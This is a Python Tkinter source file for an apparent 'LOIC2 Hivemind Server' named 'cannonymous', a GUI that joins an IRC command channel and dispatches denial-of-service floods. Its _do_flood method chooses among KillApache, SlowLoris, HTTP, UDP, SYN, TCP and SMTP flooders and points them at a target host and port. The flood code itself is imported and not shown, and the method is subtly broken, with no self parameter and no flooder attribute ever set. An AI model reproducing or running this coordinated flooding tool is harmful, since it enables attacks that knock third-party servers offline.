#!/usr/bin/env python

from Tkinter import *
from Core.Events import *
from Core.IRC import *
from threading import Thread
from Core.Flood import *


class GUI:

	def __init__(self,root):
		self.root = root
		root.protocol("WM_DELETE_WINDOW", self._quit)
		root.title('cannonymous')
		frame = Frame(self.root)
		Label(frame,text='LOIC2 Hivemind Server').pack(side=TOP)
		frame.pack()
		self.label = Label(frame,text="Offline")
		self.label.pack(side=BOTTOM)
		getEventManager().addListener(IRC_EVENT,self._on_irc_event)
		getEventManager().addListener(ERR,self._on_error)
		buttonQuit = Button(frame,text="Connect",command=self._do_connect)
		buttonQuit.pack(side=BOTTOM)

		_frame = Frame(frame)
		ircServLabel = Label(_frame,text="Server: ")
		ircServLabel.pack(side=TOP)
		ircPortLabel = Label(_frame,text="Port: ")
		ircPortLabel.pack(side=TOP)
		ircChanLabel = Label(_frame,text="Channel: ")
		ircChanLabel.pack(side=TOP)
		_frame.pack(side=LEFT)

		_frame = Frame(frame)
		self.ircServ = Entry(_frame)
		self.ircServ.pack(side=TOP)
		self.ircPort = Entry(_frame)
		self.ircPort.pack(side=TOP)
		self.ircChan = Entry(_frame)
		self.ircChan.pack(side=TOP)
		_frame.pack(side=LEFT)
		self.irc = None
		getEventManager().start()


	def _do_connect(self):
		host = self.ircServ.get().strip()
		if len(host) == 0:
			getEventManager().signalEvent(Event(ERR,"Invalid Server"))
			return
		port = None
		try:
			port = int(self.ircPort.get().strip())
		except:
			getEventManager().signalEvent(Event(ERR,"Invalid Port"))
			return
		channel = self.ircChan.get().strip()
		if len(channel) == 0:
			getEventManager().signalEvent(Event(ERR,"Channel Needed"))
			return
 		if channel[0] != '#':
			getEventManager().signalEvent(Event(ERR,"Invalid Channel"))
			return
		if self.irc:
			Thread(target=self.irc.disconnect,args=()).start()

		self.irc = IRC(host,port,channel)
		Thread(target=self.irc.connect,args=()).start()
	
		

	def _quit(self):
		self._on_exit()
		self.root.destroy()

	def _on_irc_event(self,event):
		self.label['fg'] = 'black'
		self.label['text'] = event

	def _on_error(self,event):
		self.label['fg'] = 'red'
		self.label['text'] = event

	def mainloop(self):
		self.root.mainloop()

	def _on_exit(self):
		if self.irc:
			self.label['text'] = 'Disconnecting...'
			self.irc.disconnect()
		getEventManager().stop()

	def _do_flood(target,port,floodtype="http"):
		if self.flooder:
			self.flooder.stop()
			self.flooder = None
		if floodtype == 'apache':
			self.flooder = KillApache()
		elif floodtype == 'slowloris':
			self.flooder = SlowLoris()
		elif floodtype == 'http':
			self.flooder = HTTP()
		elif floodtype == 'udp':
			self.flooder = UDP()
		elif floodtype == 'syn':
			self.flooder = SYN()
		elif floodtype == 'tcp':
			self.flooder = TCP()
		elif floodtype == 'smtp':
			self.flooder = SMTP()

	
		if self.flooder:
			self.flooder.target = (target,port)
			self.flooder.start()	
		else:
			getEventManager().signalEvent(Event(ERR,'Invalid Flooder Type: %s'%floodtype))
		
	
def main():
	import sys
	root = Tk()
	GUI(root).mainloop()
	sys.exit(0)
if __name__ == '__main__':
	main()
